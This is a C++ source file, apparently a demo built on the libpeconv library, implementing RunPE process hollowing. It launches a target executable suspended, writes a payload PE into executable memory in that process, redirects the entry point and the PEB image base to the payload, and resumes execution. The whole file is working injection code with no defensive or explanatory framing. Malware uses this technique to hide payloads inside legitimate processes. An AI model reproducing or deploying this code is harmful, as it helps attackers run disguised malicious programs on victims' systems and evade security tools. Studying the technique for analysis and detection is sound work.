#include "run_pe.h"

#include "peconv.h"

bool create_new_process(IN LPSTR path, OUT PROCESS_INFORMATION &pi)
{
    STARTUPINFO si;
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    if (!CreateProcessA(
            NULL,
            path,
            NULL, //lpProcessAttributes
            NULL, //lpThreadAttributes
            FALSE, //bInheritHandles
            CREATE_SUSPENDED, //dwCreationFlags
            NULL, //lpEnvironment 
            NULL, //lpCurrentDirectory
            &si, //lpStartupInfo
            &pi //lpProcessInformation
        ))
    {
        printf("[ERROR] CreateProcess failed, Error = %x\n", GetLastError());
        return false;
    }
    return true;
}

bool read_remote_mem(HANDLE hProcess, ULONGLONG remote_addr, OUT void* buffer, const size_t buffer_size)
{
    memset(buffer, 0, buffer_size);
    if (!ReadProcessMemory(hProcess, LPVOID(remote_addr), buffer, buffer_size, NULL)) {
        printf("[ERROR] Cannot read from the remote memory!\n");
        return false;
    }
    return true;
}

bool get_remote_context(PROCESS_INFORMATION &pi, CONTEXT &context)
{
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    return GetThreadContext(pi.hThread, &context);
}

bool update_remote_entry_point(PROCESS_INFORMATION &pi, CONTEXT &context, ULONGLONG entry_point_va)
{
#ifdef _DEBUG
    printf("Writing new EP: %x\n", entry_point_va);
#endif

#if defined(_WIN64)
    context.Rcx = entry_point_va;
#else
    context.Eax = static_cast<DWORD>(entry_point_va);
#endif
    if (SetThreadContext(pi.hThread, &context)) {
        return true;
    }
    DWORD last_err = GetLastError();
    printf("last err: %d %x\n", last_err, last_err);
    return false;
}

ULONGLONG get_remote_peb_addr(const CONTEXT &context)
{
    ULONGLONG PEB_addr = 0;
#if defined(_WIN64)
    PEB_addr = context.Rdx;
#else
    PEB_addr = context.Ebx;
#endif
    return PEB_addr;
}

bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &pi, CONTEXT &context)
{
    //1. Calculate VA of the payload's EntryPoint
    DWORD ep = get_entry_point_rva(loaded_pe);
    ULONGLONG ep_va = (ULONGLONG)load_base + ep;

    //2. Write the new Entry Point into context of the remote process:
    if (!update_remote_entry_point(pi, context, ep_va)) {
        printf("Cannot update remote EP!\n");
        return false;
    }
    //3. Get access to the remote PEB:
    ULONGLONG remote_peb_addr = get_remote_peb_addr(context);
    if (!remote_peb_addr) {
        printf("Failed getting remote PEB address!\n");
        return false;
    }
    PEB* remote_peb = (PEB*) remote_peb_addr;
    LPVOID remote_img_base = &(remote_peb->ImageBaseAddress);
#ifdef _DEBUG
    printf("Remote PEB: %p\n", remote_peb);
#endif
    SIZE_T written = 0;
    const size_t img_base_size = sizeof(PVOID);
#ifdef _DEBUG
    printf("ImageBaseSize: %d\n", img_base_size);
#endif
    //4. Write the payload's ImageBase into remote process' PEB:
    if (!WriteProcessMemory(pi.hProcess, remote_img_base, 
        &load_base, img_base_size, 
        &written)) 
    {
        printf("Cannot update ImageBaseAddress!\n");
        return false;
    }
    return true;
}

bool _run_pe(BYTE *loaded_pe, size_t payloadImageSize, PROCESS_INFORMATION &pi)
{
    if (loaded_pe == NULL) return false;

    //1. Get the context of the suspended process:
    CONTEXT context = { 0 };
    if (!get_remote_context(pi, context)) {
        printf("Getting remote context failed!\n");
        return false;
    }

    //2. Allocate memory for the payload in the remote process:
    LPVOID remoteBase = VirtualAllocEx(pi.hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBase == NULL)  {
        printf("Could not allocate memory in the remote process\n");
        return false;
    }
#ifdef _DEBUG
    printf("Allocated remote ImageBase: %p size: %lx\n", remoteBase, static_cast<ULONG>(payloadImageSize));
#endif
    //3. Relocate the payload (local copy) to the Remote Base:
    if (!relocate_module(loaded_pe, payloadImageSize, (ULONGLONG) remoteBase)) {
        printf("Could not relocate the module!\n");
        return false;
    }
    //4. Guarantee that the subsystem of the payload is GUI:
    set_subsystem(loaded_pe, IMAGE_SUBSYSTEM_WINDOWS_GUI);

    //5. Update the image base of the payload (local copy) to the Remote Base:
    update_image_base(loaded_pe, (ULONGLONG) remoteBase);

#ifdef _DEBUG
    printf("Writing to remote process...\n");
#endif
    //6. Write the payload to the remote process, at the Remote Base:
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteBase, loaded_pe, payloadImageSize, &written)) {
        return false;
    }
#ifdef _DEBUG
    printf("Loaded at: %p\n", loaded_pe);
#endif
    //7. Redirect the remote structures to the injected payload (EntryPoint and ImageBase must be changed):
    if (!redirect_to_payload(loaded_pe, remoteBase, pi, context)) {
        printf("Redirecting failed!\n");
        return false;
    }
    //8. Resume the thread and let the payload run:
    ResumeThread(pi.hThread);
    return true;
}

bool is_bitness_compatibile(BYTE* loaded_pe)
{
    WORD arch = get_pe_architecture(loaded_pe);
#ifndef _WIN64
    if (arch == IMAGE_FILE_MACHINE_AMD64) {
        printf("Incompatibile payload architecture!\n");
        printf("Only 32 bit payloads can be injected from 32bit loader!\n");
        return false;
    }
#else
    if (arch == IMAGE_FILE_MACHINE_I386) {
        printf("Incompatibile payload architecture!\n");
        printf("Injecting 32 bit payload from 64 bit loader is possible, but currently not implemented!\n");
        return false;
    }
#endif
    return true;
}

bool run_pe(char *payloadPath, char *targetPath)
{
    //1. Load the payload:
    size_t payloadImageSize = 0;
    // Load the current executable from the file with the help of libpeconv:
    BYTE* loaded_pe = load_pe_module(payloadPath, payloadImageSize, false);
    if (!loaded_pe) {
        printf("Loading failed!\n");
        return false;
    }

    //Check payload archtecture
    if (!is_bitness_compatibile(loaded_pe)) {
        free_pe_module(loaded_pe, payloadImageSize);
        return false;
    }

    //2. Create the target process (suspended):
    PROCESS_INFORMATION pi = { 0 };
    bool is_created = create_new_process(targetPath, pi);
    if (!is_created) {
        printf("Creating target process failed!\n");
        free_pe_module(loaded_pe, payloadImageSize);
        return false;
    }
    
    //3. Perform the actual RunPE:
    bool isOk = _run_pe(loaded_pe, payloadImageSize, pi);

    //4. Cleanup:
    free_pe_module(loaded_pe, payloadImageSize);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    //---
    return isOk;
}